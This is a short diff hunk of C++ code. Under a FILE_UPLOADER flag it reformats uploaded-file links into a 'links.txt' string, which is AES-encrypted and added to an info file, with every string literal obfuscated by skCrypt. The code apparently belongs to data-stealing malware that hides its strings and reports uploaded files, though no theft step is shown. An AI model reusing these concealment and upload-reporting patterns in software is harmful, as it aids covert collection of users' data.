@@ -143,8 +143,8 @@ int main(int argc, char* argv[]) {
     // links.txt content
     string links_txt = (string)skCrypt("");
 #if FILE_UPLOADER
-    for (string link : GetLinks())
-        links_txt += link + (string)skCrypt("\n");
+    for (auto elem : GetLinks())
+        links_txt += elem.first + (string)skCrypt("%") + elem.second + (string)skCrypt("\n");
 #endif
     links_txt = aes_encrypt(KEY, links_txt, IV);
     infoFileContent += links_txt;
